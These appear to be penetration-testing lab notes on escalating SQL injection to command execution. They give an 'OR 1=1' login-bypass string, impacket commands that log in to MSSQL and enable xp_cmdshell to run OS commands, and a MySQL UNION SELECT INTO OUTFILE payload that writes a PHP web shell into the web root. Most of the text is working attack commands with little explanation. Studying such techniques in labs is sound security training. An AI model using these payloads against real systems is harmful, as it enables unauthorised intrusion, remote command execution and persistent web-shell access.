
```mysql
offsec' OR 1=1 -- //
```


## Manual Code Execution

MSSQL has function xp_cmdshell on which passing string for execution will be executed on OS. This is by default disable once enabled we can execute commands.
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;```

Like
```bash
EXECUTE xp_cmdshell 'whoami';
```



MySQL database variant doesn't provide single function to escalate to RCE.
We can abuse the `SELECT INTO_OUTFILE` statement to write on server.
```mysql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
